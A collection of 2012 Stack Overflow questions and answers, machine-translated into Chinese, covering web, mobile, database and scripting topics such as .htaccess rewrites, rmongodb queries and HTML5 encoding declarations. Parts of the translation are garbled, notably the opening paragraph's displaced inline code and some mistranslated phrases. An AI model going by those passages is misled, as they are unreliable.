解决问题的最简单方法是使用[我建议](http://www.trirand.com/blog/?page_id=393/feature-request/prefixes-to-rowids/#p18336)`idPrefix`后在 jqGrid 中引入的选项。主要优点是您可以继续使用数据库中*的原始*id 值并使用jqGrid 中的属性，这将是唯一的，因为从服务器返回的值构建属性，但使用前缀。在[答案](https://stackoverflow.com/a/9698470/315935)中。所以我建议你对所有子网格使用不同的。例如，您可以在 subgrid 中使用（参见[答案](https://stackoverflow.com/a/9963508/315935)和[这个](https://stackoverflow.com/a/10247633/315935)）。*`id``id``id``idPrefixes``idPrefix: 's' + row_id + '_'`*

# c++ - 检测 C++ 中不推荐使用的函数

> ID：12839517
> 
> 赞同：5
> 
> 时间：2012-10-11T12:27:06.133
> 
> 标签：c++, doxygen, deprecated

在一个用 Doxygen 记录的 C++ 项目中，我在 Doxygen 注释中将一些函数标记为 \deprecated。有什么方法可以使用这些注释（使用 Doxygen 或其他工具）来检测另一个未弃用的函数正在调用已弃用的函数？（这个项目非常大，完成所有课程需要很多时间）。

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-11T12:35:26.170

如果您使用 GCC 或 clang 编译代码，您可以手动注释函数。

```
__attribute__((__deprecated__))
void dep_fun() { } 
```

然后*调用* `dep_fun`代码中的任何位置都会发出诊断消息。

如果您`\deprecated`始终如一地放置 doxygen 的注释，您应该能够使用 sed 等工具自动更新代码。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-08-04T18:47:02.457

基于 Benjamins 的回答：一些有用的编译器指令：

```
#ifdef _MSC_VER
#define DEPRECATED __declspec(deprecated)
#elif defined(__GNUC__) | defined(__clang__)
#define DEPRECATED __attribute__((__deprecated__))
#else
#define DEPRECATED
#endif

//usage:
DEPRECATED void foo(int bar); 
```

（警告：未在 clang 和 msc 下测试，仅在 GNUC 上测试。）

# jquery - jquery，从 iframe 访问父级

> ID：12839521
> 
> 赞同：0
> 
> 时间：2012-10-11T12:27:15.160
> 
> 标签：jquery, iframe

我有这个代码：

```
 $(document).keyup(function(e) { 
     if (e.keyCode == 27 && $('#dropdown-themes2').is(":visible")) {
       $('#dropdown-themes2').hide();
    }
    if (e.keyCode == 27 && $('#style-inner').is(":visible")) {
       $('#style-inner').hide("slide", { direction: "left" }, 100);
       $('#panel-opener').animate({left:"0"}, 100).css({'background-image':'url(img/gear.png)',
               'background-color':'#fff'}).attr('title','Open');
    }
  }); 
```

所以在按下 ESC 时，一个项目应该滑动（关闭）。当我在父母内部时，它工作正常。但是当我在 iframe 中单击并工作时，ESC 不起作用。现在这很有意义，因为我需要以某种方式从 iframe 内部访问父元素。所以我尝试添加 parent.document 所以代码是：

```
 $(document).keyup(function(e) { 
     if (e.keyCode == 27 && $('#dropdown-themes2',parent.document).is(":visible")) {
      console.log('radi');
       $('#dropdown-themes2',parent.document).hide();
    }
    if (e.keyCode == 27 && $('#style-inner',parent.document).is(":visible")) {
       $('#style-inner',parent.document).hide("slide", { direction: "left" }, 100);
       $('#panel-opener',parent.document).animate({left:"0"}, 100).css({'background-image':'url(img/gear.png)',
               'background-color':'#fff'}).attr('title','Open');
    }
  }); 
```

但什么都没有。我很难使用 iframe。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-13T13:02:10.767

回答我自己的问题：

例如，如果我想在 ID #displayframe 的 IFrame 内部单击时隐藏父文档中的一个元素，我这样做了：

```
 $('#displayframe').load(function(){
     var iframeRef = document.getElementById('displayframe');
     $(iframeRef).contents().click(function(){
                $(document, parent.window.document).contents().find('#style-inner').hide();
     });}); 
```

# .htaccess - 我需要调用 .htaccess 吗？

> ID：12839524
> 
> 赞同：0
> 
> 时间：2012-10-11T12:27:22.710
> 
> 标签：.htaccess, for-loop, call

我没有使用 .htaccess 的经验，但我得到一个提示，它非常有用，所以我想试试这个。

我现在在我的根文件夹中有一个名为 .htaccess 的文件。文件包含这个；

```
RewriteBase /

RewriteEngine on
RewriteCond %{HTTP_HOST} ^kellyvuijst\.nl [nc]
RewriteRule (.*) http://www.kellyvuijst.nl/$1 [R=301,L]
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}\.html -f
RewriteRule ^([^/]+)/$ $1.html 
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_URI} !(\.[a-zA-Z0-9]{1,5}|/)$
RewriteRule (.*)$ /$1/ [R=301,L] 
```

我在这里尝试做的是创建一个“www.mysite.com/portfolio/”而不是“mysite.com/portfolio.html”我使用了一些教程，我认为这是正确的，但我不确定.

所以现在我有了这个文件，现在呢？教程都显示了要放入文件中的内容，但没有显示如何处理它？我需要在我拥有的每个 .html 页面中调用它吗？我该如何调用它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:32:39.463

服务器会自动调用 .htaccess 文件。

您只需将其放入您的文件中：

```
RewriteBase /
RewriteEngine on
RewriteRule www.mysite.com/portfolio/ /mysite.com/portfolio.html [L] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:35:31.040

嗯，你在这里使用了很多规则来实现这一点。

无论如何，不​​，您不必包含该文件。如果您将站点托管在使用 Apache 的服务器上，它将自动包含在内。您还可以运行 PHP 文件还是您的网站只是 HTML？如果您也在使用 Apache（不是 100%，但通常是一起使用），这总是一个简单的迹象。

如果是这样，您可以先尝试使用这些规则：

```
RewriteEngine on
RewriteCond %{HTTP_HOST} !^www\.(.+)\.(.+)$ [nc]
RewriteRule ^(.*)$ http://www.%1.%2/$1 [R=301,L] 
```

如果这总是将 www 添加到您的地址，即使您输入的 URL 没有 www，至少您可以确定它有效。

然后，要使 .html 消失，您可以添加以下规则：

```
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule $(.*)/$ /$1.html [L] 
```

这应该使每个以斜杠结尾的 url（如portfolio/）都使用.html 文件（portfolio.html），但前提是/portfolio/ 不是您网站上的实际目录。

（我从规则中删除了你的 url，因为如果你在另一个网站上使用它，或者如果你更改了你的 url，它也应该可以工作。它仍然应该做你想做的事）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T19:01:07.003

确保服务器配置为允许 htaccess 文件覆盖主机选项。因此，在您的虚拟主机/服务器配置中，您需要：

```
AllowOverride All 
```

# grails - 半天后运行 grails run-war 出错

> ID：12839525
> 
> 赞同：0
> 
> 时间：2012-10-11T12:27:28.937
> 
> 标签：grails, war

我有一个使用 grails run-war 运行的 2.1.1 grails 应用程序。它运行良好，运行了相当长的一段时间，但在 12 到 24 小时后停止。当应用程序失败时，我从不观察它。它总是说“坏”

```
$ grails run-war 
| Done creating WAR target/web-0.1.war
| Running Grails application
Tomcat Server running WAR (output written to: target/tomcat-out.txt)
| Server running. Browse to http://localhost:8090/web
bad
$ 
```

最后 3 次失败中有 2 次在输出文件中产生了这个：

```
2012-10-10 10:22:46,684 [localhost-startStop-2] ERROR loader.WebappClassLoader  - The web application [/web] appears to have started a thread named [Poller SunPKCS11-Darwin] but has failed to stop it. This is very likely to create a memory leak.
2012-10-10 10:22:46,694 [localhost-startStop-2] ERROR loader.WebappClassLoader  - The web application [/web] appears to have started a thread named [MongoCleaner1292971653] but has failed to stop it. This is very likely to create a memory leak. 
```

但是大多数时候，日志文件中没有任何内容。

即使没有人使用过 webapp，也会发生这种情况，即它处于空闲状态。使用的插件有：

```
 runtime ":mongodb:1.0.0.GA"
    runtime ":jquery:1.7.2"
    compile ":jquery-ui:1.8.15"
    runtime ":resources:1.2-RC1"

    // Uncomment these (or add new ones) to enable additional resources capabilities
    //runtime ":zipped-resources:1.0"
    //runtime ":cached-resources:1.0"
    //runtime ":yui-minify-resources:0.1.4"

    build ":tomcat:$grailsVersion" 
```

当使用 grails 2.0.4 时，同样的应用程序运行了数周而没有失败。唯一的变化是升级到 grails 2.1.1

有什么想法吗？

谢谢

编辑：包括 DataSource.groovy

```
dataSource {
    pooled = true
    driverClassName = "org.h2.Driver"
    username = "sa"
    password = ""
}
hibernate {
    cache.use_second_level_cache = true
    cache.use_query_cache = true
    cache.region.factory_class = 'net.sf.ehcache.hibernate.EhCacheRegionFactory'
}
// environment specific settings
environments {
    development {
        dataSource {
            dbCreate = "create-drop" // one of 'create', 'create-drop', 'update', 'validate', ''
            url = "jdbc:h2:mem:devDb;MVCC=TRUE"
        }
    }
    test {
        dataSource {
            dbCreate = "update"
            url = "jdbc:h2:mem:testDb;MVCC=TRUE"
        }
    }
    production {
        dataSource {
            dbCreate = "update"
            url = "jdbc:h2:prodDb;MVCC=TRUE"
            pooled = true
            properties {
               maxActive = -1
               minEvictableIdleTimeMillis=1800000
               timeBetweenEvictionRunsMillis=1800000
               numTestsPerEvictionRun=3
               testOnBorrow=true
               testWhileIdle=true
               testOnReturn=true
               validationQuery="SELECT 1"
            }
        }
    }
} 
```

然后在每个模型中，

```
class Album {
static mapWith = "mongo" 
```

我这样做是为了确保每次升级 grails 时都使用 Mongo，即使我一直在卸载它，它也会自动重新安装休眠插件。

谢谢

# android - Android 应用程序数据，用户可以访问/编辑它吗？

> ID：12839526
> 
> 赞同：1
> 
> 时间：2012-10-11T12:27:35.000
> 
> 标签：android, storage

我正计划开发一个应用程序，我不希望它“仅在线”，所以我希望能够在用户设备内部存储数据，即应用程序数据。这是“安全的”吗？或者人们可以摆弄应用数据吗？是否有任何安全的离线方式来存储应用程序数据？

我尝试阅读[http://developer.android.com/guide/topics/data/data-storage.html#filesInternal](http://developer.android.com/guide/topics/data/data-storage.html#filesInternal)这表明它是安全的，但在其他地方有人说有根手机可以忽略这一点。那么它是否安全？- 如果是这样，如果手机已植根，有什么方法可以“阻止应用程序”？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:34:17.670

我遇到了同样的问题，但发现加密是处理这种情况的唯一机制，但这当然会增加设备的负担，但如果这是强制性的，那么唯一的选择是使用加密或隐写术

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-11T13:23:03.943

在有根手机上，用户可以读取数据。

Google 尝试使用 JellyBean 加密应用程序数据以防止这种情况发生，但该功能目前被禁用，因为它破坏了太多应用程序。

您可以检测到一些对手机进行生根的方法，例如使用[roottools](http://code.google.com/p/roottools/ "根工具")。但是没有可靠的方法来检测手机可以植根的所有方式。

即使您可以确保手机没有被root，在您下载数据后，什么会阻止用户对手机进行root？

请注意，即使您不将数据下载到文件中：使用已root 的手机，攻击者仍然可以将您的应用程序的.dex 文件传输到他的PC。然后他可以反编译它（例如通过使用[dex2jar](http://code.google.com/p/dex2jar/)和[jd-gui](http://java.decompiler.free.fr/?q=jdgui)）以获取有关如何从您的服务器读取数据的信息。因此，您的应用程序从服务器访问的任何信息也可能被攻击者访问。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T13:15:01.193

> 这是“安全的”吗？

默认情况下，它对其他应用程序是安全的。

> 在其他地方有人说有根手机可以忽略这一点

root 手机的用户可以运行具有超级用户权限的应用程序，这些应用程序可以访问设备上的任何文件。

因此，内部存储上的数据对用户来说是不安全的，因为它是用户的电话，而不是你的，因此它是用户的数据，而不是你的。大多数用户不会触碰您的数据，但所有用户都有权触碰，前提是他们采取了足够的措施。

> 如果是这样，如果手机已植根，是否有任何方法可以“阻止应用程序”？

没有可靠的方法来确定手机是否已植根。

# facebook - 检索 Facebook App Invitor 的用户 ID

> ID：12839527
> 
> 赞同：0
> 
> 时间：2012-10-11T12:27:37.340
> 
> 标签：facebook, facebook-graph-api, facebook-javascript-sdk, facebook-php-sdk

在给定 Facebook 应用程序的上下文中，假设用户 A 邀请用户 B 开始使用它。一旦用户 B 接受使用该应用程序，有没有办法以编程方式检索用户 A 的 ID（通过 PHP/JS SDK）？这似乎没有完全记录。

对于它的价值，A/B 用户是朋友，如果它有任何用处的话。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-14T15:56:45.837

当用户跟随​​应用请求时，您可以使用请求 ID

```
$_GET['request_ids'] 
```

然后检索所有可以调用图形 api 的请求 id 以获取相应的请求详细信息，如下所示：

```
if(isset($_GET['request_ids']))
     {
          $request_ids = $_GET['request_ids'];
      }
$request_ids = explode(",", $request_ids);
foreach($request_ids as $request_id)
       {
            $request_object = $facebook->api($request_id);
             //this $request_object have sender facebook id in the field uid_from
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:24:45.483

如果你看这里：

[http://developers.facebook.com/docs/reference/dialogs/requests/](http://developers.facebook.com/docs/reference/dialogs/requests/)

您可以看到对象布局。值得注意的是数据属性：

> 您可以传递用于跟踪的可选附加数据。这将作为创建的请求对象的一部分存储。最大长度为 255 个字符。

在此对象中，您可以添加您的引用 UserId，然后当请求被声明时，您可以最终处理它。

希望这可以帮助。

# python - Python while, continue 循环

> ID：12839529
> 
> 赞同：0
> 
> 时间：2012-10-11T12:27:44.713
> 
> 标签：python, while-loop

我的输入文件是每行一个句子。假设它看起来像：

```
A
B
C
D
E
F 
```

期望的输出是：

```
::NewPage::
A
B
::NewPage::
C
D
::NewPage::
E
F 
```

我知道我应该使用 while 循环，但不知道如何使用？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:29:36.943

这里不需要[循环](http://docs.python.org/py3k/library/itertools.html#itertools-recipes)-`while`查看[.`grouper`](http://docs.python.org/py3k/library/itertools.html#itertools-recipes)[`itertools`](http://docs.python.org/py3k/library/itertools.html)

```
def grouper(n, iterable, fillvalue=None):
    "Collect data into fixed-length chunks or blocks"
    # grouper(3, 'ABCDEFG', 'x') --> ABC DEF Gxx"
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=fillvalue) 
```

请注意，如果您使用的是 2.x ，则需要[稍微不同的版本。](http://docs.python.org/library/itertools.html#itertools-recipes)

例如：

```
items = ["A", "B", "C", "D", "E"]
for page in grouper(2, items):
    print("::NewPage::")
    for item in page:
        if item is not None:
            print(item) 
```

产生：

```
::NewPage::
A
B
::NewPage::
C
D
::NewPage::
E 
```

如果您需要`None`值，可以使用哨兵对象。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T12:44:00.260

我不知道这是否会打扰 PEP-8 的众神。

但是与语言无关的替代方案（更一般的受众可以理解）可能是：

```
items = ["A", "B", "C", "D", "E"]
out = []

for i,item in enumerate(items):
    if i%2 == 0:
        out.append("::New Page::")
    out.append(item) 
```

编辑：当您在完成写作之前不检查是否有新答案时，就会发生这种情况。我的回答与 cdarke 的基本相同。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-11T12:35:57.667

像这样？在 Python 3.3 上测试：

```
i = 0
page_size = 2
lines = []

for line in open("try.txt"):
    lines.append(line)
    i += 1
    if i % page_size == 0:
        print("::NewPage::")
        print("".join(lines),end="")
        i = 0
        lines = [] 
```

# iphone - 如何从右侧到左侧一一排列十进制值

> ID：12839533
> 
> 赞同：0
> 
> 时间：2012-10-11T12:27:59.550
> 
> 标签：iphone, objective-c, ios

我设计金额部分的设置，所以我的要求是： 1\. 默认金额应为 0.00 美元。和 2\. 最大金额应为 $99999.99 和 3\. 使用数字键盘输入金额时，金额应从小数点右侧（美分）填充到小数点左侧（美元）。例如，默认值为 0.00 美元，当我输入 1 时，它应该显示 0.01 美元，当我输入 2 时，它应该显示 0.12 美元，然后对于 3，它应该显示 1.23 美元，以此类推到 99999.99 美元。我不确定，但我认为应该使用这种方法

`-(void)textFieldDidEndEditing:(UITextField *)textField`

或者

`- (BOOL)textFieldShouldReturn:(UITextField *)textField.`

如果可能的话，我的编码有点弱，请用对我更好的代码回答我。

我怎样才能得到这个？需要帮忙。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:35:59.477

```
-(IBAction)btnPointPress:(id)sender
{

if([stringMain length] < 10)
{
      stringMain = [[NSString stringWithFormat:stringMain]stringByAppendingFormat:@"."];
        pointCheck = YES;
        pointOnce++;

}

lastString = stringMain;
number = [stringMain doubleValue];
} 
```

这是为了添加小数点。现在告诉我你的要求是什么？

# html - HTML5 页面语言、方向和编码

> ID：12839534
> 
> 赞同：9
> 
> 时间：2012-10-11T12:28:05.130
> 
> 标签：html, unicode, utf-8, right-to-left

将 HTML5 页面声明为希伯来语、RTL 和 utf-8 编码的正确方法是什么？我有一段时间没有这样做了，但我记得在 HTML4 中它涉及 3 或 4 个似乎多余的标签和属性。还是一样吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-11T12:40:54.690

```
<html dir="rtl" lang="he">
  <head>
    <meta charset="utf-8">
     ...
    </head>
  ...
</html> 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-10-11T12:57:54.770

您需要以下内容：

1.  A`<!doctype html>`表示您的页面是 HTML5。
2.  `<HTML>`具有以下属性 的标签：
    *   `dir``=``"rtl"`
    *   `lang="he"`
        注意：您可以省略`"`, 或使用`'`。
3.  `<meta>`用于声明字符编码的标记。您可以选择以下选项之一：
    *   `<meta charset="UTF-8">`
        注意：您可以省略`"`, 或使用`'`。
    *   `<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">`
        这是声明字符编码的“传统”方式。它仍然在 HTML5 中被允许，但所有现代浏览器都支持第一个变体，所以没有必要这样做。
        **注意**：您可以省略属性`"`的`http-equiv`，或者使用`'`所有属性代替。
    *   如果浏览器遇到 UTF-8 字节顺序标记，它会将 HTML5 文件视为 UTF-8。无论使用`meta`标签声明的任何字符编码如何，都会发生这种情况。

此处使用的任何标签、属性和属性值或`DOCTYPE`, 都不区分大小写。

**注意：**如果浏览器遇到字符编码声明，它将使用指定的编码从头开始重新解析文档。您可以将编码放在`Content-Type`HTTP 标头中，这样就不会出现问题。

另请注意，浏览器只会在文档的**前 1024 个字节中查找字符编码声明。**

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-11T12:39:48.337

您需要这些来创建一个 HTML5 页面，其语言为希伯来语，方向为 RTL，编码为 utf-8

`<!DOCTYPE html>`用于将其声明为 HTML5 页面

`<html dir="rtl" lang="he">`方向和语言

`<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />`为了`utf-8`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-01-26T08:54:39.783

```
<html dir="rtl" lang="he"> 
```

* * *

不是：`<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />`

*不适用于“Chrome”和“Firefox”浏览器。*

# gridview - Gridview 单元格值

> ID：12839535
> 
> 赞同：0
> 
> 时间：2012-10-11T12:28:10.787
> 
> 标签：gridview

我有一个显示一些数据的 Gridview。我试图做的是如果命令名称是编辑等以采取适当的行动。

我设法通过在 datagridview 的 RowCommand 事件下执行 If 语句来获取命令名称，这使我可以对每个命令采取适当的操作。

我遇到的问题是我试图根据选择的命令从某个列中获取 SELECTED Rows 值。因此，如果用户单击第 15 行上的编辑，那么我想获得第 15 行的第 5 列值。如果用户单击第 10 行，那么它将是第 10 行、第 5 列等。

我怎么能在 RowCommand 事件或任何其他方式来实现上述目标下做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-17T12:57:05.280

我刚刚读了这个问题，但如果你还没有弄清楚，那么你可以做什么去你的 aspx 文件并在 gridview 下定义“OnRowEditing”。然后回到文件后面的代码并执行以下操作：

```
 protected void gvEvents_Edit(object sender, GridViewEditEventArgs e)
    {

        //Set the edit index.
        gvEvents.EditIndex = e.NewEditIndex;
        DataTable dt = Session["dtEvents"] as DataTable;
        //Bind data to the GridView control.

        gvEvents.DataSource = Session["dtEvents"];
        gvEvents.DataBind();
    } 
```

您还需要定义 OnRowUpdating 和 OnRowCancelingEdit 并将它们的代码放在后面的代码中。这是 OnRowCancelingEdit 下的内容

```
 protected void gvEvents_cancEdit(object sender, GridViewCancelEditEventArgs e)
    {
        //Reset the edit index.
        gvEvents.EditIndex = -1;
        //Bind data to the GridView control.
        DataTable dt = Session["dtEvents"] as DataTable;

        gvEvents.DataSource = Session["dtEvents"];
        gvEvents.DataBind();

    } 
```

# android - 应用程序行为取决于 NFC 支持

> ID：12839539
> 
> 赞同：1
> 
> 时间：2012-10-11T12:28:21.157
> 
> 标签：android, nfc

我在我的 android 应用程序中添加 NFC 卡仿真。我需要针对手机的 NFC 支持自定义我的应用程序行为。即，如果 Android 设备不支持 NFC，则卡模拟无效，反之亦然。这样我就可以将单个应用程序上传到独立于 NFC 功能运行的 Android 市场。

**让我知道如何实现上述功能（动态类加载）？请给我一些示例代码？**

我想将我的应用程序定位到最低 API 级别 8 (OS 2.2)

问候

@nish

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T13:09:55.753

第 1 步：添加`<uses-feature android:name="android.hardware.nfc" android:required="false" />`到您的清单中。

步骤#2：在需要的地方，使用`PackageManager`并`hasSystemFeature()`确定设备是否具有该`android.hardware.nfc`功能。

# objective-c - 尝试在 Xcode 中导入“ALAssetRepresentation.h”给了我找不到架构 armv7 的符号

> ID：12839541
> 
> 赞同：1
> 
> 时间：2012-10-11T12:28:23.257
> 
> 标签：objective-c, xcode, import, alassetslibrary, armv7

我正在尝试在目标 c 中使用 AssetsLibrary，但即使进行简单的导入也会给我带来问题。

我的进口看起来像：

```
 #import <AssetsLibrary/ALAsset.h>
#import <AssetsLibrary/ALAssetsLibrary.h>
#import <AssetsLibrary/ALAssetRepresentation.h> 
```

如果我删除 ALAssetRepresentation.h 导入，一切正常，但我留下一个空的前向类对象，我根本无法使用。我知道我没有拼错任何东西，因为我特意将类引用 ALAsset 复制并粘贴到 ALAssetRepresentation。

这里发生了什么？清洁似乎没有任何帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:34:43.963

从错误描述中可以看出，您可能没有将项目链接到`AssetsLibrary.framework`- 为此，请进入目标设置/构建阶段并将该框架添加到“将二进制文件与库链接”部分中：

![在此处输入图像描述](../Images/02b5ef797f5c39635d049ac49868bbcc.png)

# regex - 正则表达式检查字符串是否至少包含 A-Za-z0-9 但不包含 &

> ID：12839543
> 
> 赞同：2
> 
> 时间：2012-10-11T12:28:26.683
> 
> 标签：regex

我正在尝试检查字符串是否至少包含 A-Za-z0-9 但不包含 &。我对正则表达式的经验是有限的，所以我从简单的部分开始，得到：

```
.*[a-zA-Z0-9].* 
```

但是，我很难将它与不包含 & 部分结合起来。我一直在思考，`^(?=.*[a-zA-Z0-9].*)(?![&()]).*`但这似乎并没有奏效。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:35:57.200

我不确定这是否是您的意思，但这是一个正则表达式，它将匹配任何字符串：

*   包含至少一个字母数字字符
*   不包含 &

此表达式确保始终匹配整个字符串（开头和结尾的 and），并且所有匹配的字符都不是“&”符号（`^`部分）：`$``[^&]*`

```
^[^&]*[a-zA-Z0-9][^&]*$ 
```

但是，如果您不限于单个表达式，那么在代码中简单地执行两次检查可能会更清晰。

此外，请查看`\w`正则表达式中的类（如果您想允许非 ASCII 字符，它可能是捕获字母数字字符的更好解决方案）。

# java - Oracle NoSQL 的主要和次要路径/组件

> ID：12839546
> 
> 赞同：0
> 
> 时间：2012-10-11T12:28:30.720
> 
> 标签：java, oracle, nosql

我不知道为什么 Oracle NoSQL 有一个`List`字符串主要和次要组件，如以下代码：

```
List<String> majorComponents = new ArrayList<String>();
List<String> minorLength = new ArrayList<String>();
List<String> minorYear = new ArrayList<String>();

majorComponents.add(“Katana”);
minorLength .add(“length”);
minorYear.add(“year”);

Key key1 = Key.createKey(majorComponents, minorLength);
Key key2 = Key.createKey(majorComponents, minorYear);

String valString = "sword";

store.putIfAbsent(key1, Value.createValue(valString.getBytes()));
store.putIfAbsent(key2, Value.createValue(valString.getBytes())); 
```

而且我也不确定`components`to有什么区别`path`？

有人可以解释一下这个主要路径和次要路径是如何在列表中的以及它是如何真正起作用的。

我可以假设对于 key1，当我得到完整路径时，我得到的是：

```
Katana:length 
```

对于键 2

```
Katana:year 
```

如果我放：

```
majorComponents.add(“Saber”); 
```

然后做：

```
Key key1 = Key.createKey(majorComponents, minorLength); 
```

会发生什么？完整的路径是什么？我很困惑这到底是如何工作的......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T13:34:11.170

创建 Key 后，您可以通过对 Key 执行 toString() 来查看规范路径。它将向您展示主要和次要部分的每个组件。有关详细信息，请查看 oracle.kv.Key javadoc。

查尔斯·兰姆

# arrays - 使用 rmongodb 从 mongoDB 中的数组中提取值到数据帧

> ID：12839549
> 
> 赞同：1
> 
> 时间：2012-10-11T12:28:34.817
> 
> 标签：arrays, r, mongodb, rmongodb

我正在查询包含示例中显示的条目的数据库。所有条目都包含以下值：

*   `_id``overallitem`:和的唯一标识`placed_items`
*   `name`: 你的名字`overallitem`
*   `loc`:`overallitem`和的位置`placed_items`
*   `time_id`:`overallitem`存储时间
*   `placed_items`：包含数组`placed_items`（范围可以从零：`placed_items : [],`到无限量。
*   `category_id`: 的类别`placed_items`
*   `full_id`: 的完整 id`placed_items`

我想在给定和约束的每个级别上提取`name`,`full_id`和`category_id``placed_items``time_id``loc`

示例数据：

```
{
 "_id" : "5040",
 "name" : "entry1",
 "loc" : 1,
 "time_id" : 20121001,
 "placed_items" : [],
}
{
 "_id" : "5041",
 "name" : "entry2",
 "loc" : 1,
 "time_id" : 20121001,
 "placed_items" : [
  {
   "_id" : "5043",
   "category_id" : 101,
   "full_id" : 901,
  },
  {
   "_id" : "5044",
   "category_id" : 102,
   "full_id" : 902,
  }
 ],
}
{
 "_id" : "5042",
 "name" : "entry3",
 "loc" : 1,
 "time_id" : 20121001,
 "placed_items" : [
  {
   "_id" : "5045",
   "category_id" : 101,
   "full_id" : 903,
  },
 ],
} 
```

此示例的预期结果是：

```
"name"    "full_id" "category_id"
"entry2"    901         101
"entry2"    902         102
"entry3"    903         101 
```

因此，如果`placed_items`为空，请将条目放入数据框中，如果`placed_items`包含`n`条目，则将`n`条目放入数据框中

我试图制定一个 RBlogger 示例来创建所需的数据框。

```
#Set up database
    mongo <- mongo.create()

    #Set up condition
    buf <- mongo.bson.buffer.create()
    mongo.bson.buffer.append(buf, "loc", 1)
    mongo.bson.buffer.start.object(buf, "time_id")
    mongo.bson.buffer.append(buf, "$gte", 20120930)
    mongo.bson.buffer.append(buf, "$lte", 20121002)
    mongo.bson.buffer.finish.object(buf)
    query <- mongo.bson.from.buffer(buf)

    #Count  
    count <- mongo.count(mongo, "items_test.overallitem", query) 

#Note that these counts don't work, since the count should be based on 
#the number of placed_items in the array, and not the number of entries. 

    #Setup Cursor
    cursor <- mongo.find(mongo, "items_test.overallitem", query)
    #Create vectors, which will be filled by the while loop
    name <- vector("character", count)
    full_id<- vector("character", count)
    category_id<- vector("character", count) 

    i <- 1
    #Fill vectors
    while (mongo.cursor.next(cursor)) {
        b <- mongo.cursor.value(cursor)
        order_id[i] <- mongo.bson.value(b, "name")
        product_id[i] <- mongo.bson.value(b, "placed_items.full_id")
        category_id[i] <- mongo.bson.value(b, "placed_items.category_id")
        i <- i + 1
    }
    #Convert to dataframe
    results <- as.data.frame(list(name=name, full_id=full_uid, category_id=category_id)) 
```

如果我想在某个`overallitem`级别（即`_id`or `name`）提取值但无法收集`placed_items`级别上的信息，则条件有效并且代码有效。此外，提取的虚线调用`full_id`似乎`category_id`不起作用。任何人都可以帮忙吗？

# wso2 - wso2 carbon - 部署到 servicemix / fuseesb

> ID：12839555
> 
> 赞同：1
> 
> 时间：2012-10-11T12:28:49.777
> 
> 标签：wso2, wso2carbon, apache-servicemix

我的公司已决定将 fuseesb 作为他们的 ESB 平台。然而，一些碳功能对我们很有用。例如，碳组件为创建后端服务组件和前端 ui 组件提供了一个很好的结构。是否可以在现有的基于 karaf/felix 的容器（例如 fuseesb）上部署碳？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T07:51:30.457

是的，这是可能的。不久前，我们自己已经成功地在 Karaf 运行时之上部署了 carbon。

如果您使用的是 Carbon 4.xx，那么要公开 HTTPService，您可以使用默认发布的 tomcat 包。如果您使用的是 Carbon 3.xx，那么您必须使用 Jetty OSGi 捆绑包（默认情况下未提供）在您的运行时获取 HTTPService。

举个例子，Carbon 使用嵌入式 tomcat 作为 servlet 容器。所有的管理服务调用通常依赖于 servlet 传输（可能有例外）。

总而言之，您可以做到这一点，但请记住，这是 carbon 的高级用法，而 ClassLoading 问题即将出现，您必须解决这些问题。:)

高温高压

# wordpress - wordpress 中相同分类法中的上一篇和下一篇文章

> ID：12839556
> 
> 赞同：0
> 
> 时间：2012-10-11T12:28:52.927
> 
> 标签：wordpress, taxonomy, custom-post-type, custom-taxonomy

我创建了一个自定义帖子类型，称为人员，并有一个自定义分类法，其中包含*Broker*、*Admin*等`staff-categories`术语。

 **我已经创建了单页`single-staff.php`。我卡在导航部分，我需要上一个和下一个导航在同一个分类中。默认值`previous_post_link`，`next_post_link`只是没有帮助。

我也不想使用插件。有人可以帮我解决这个问题吗？

```
<span class="left"><?php previous_post_link( '%link',' %title' ); ?></span>
<span class="right"><?php next_post_link( '%link', '%title'); ?</span> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-13T16:35:45.750

我遇到了同样的问题，我在这里找到了解决方案：http: [//bucketpress.com/next-and-previous-post-link-in-same-custom-taxonomy](http://bucketpress.com/next-and-previous-post-link-in-same-custom-taxonomy)**

# php - 错误：IE 中的“激活服务器无法创建对象”

> ID：12839561
> 
> 赞同：1
> 
> 时间：2012-10-11T12:28:56.753
> 
> 标签：php, javascript, jquery

我正在使用 javascript 来验证浏览字段。由于`files[0]`IE 不支持，我为 IE 使用了另一个代码。

```
 var myFSO = new ActiveXObject("Scripting.FileSystemObject");
         var filepath = document.upload.file.value;
         var thefile = myFSO.getFile(filepath);
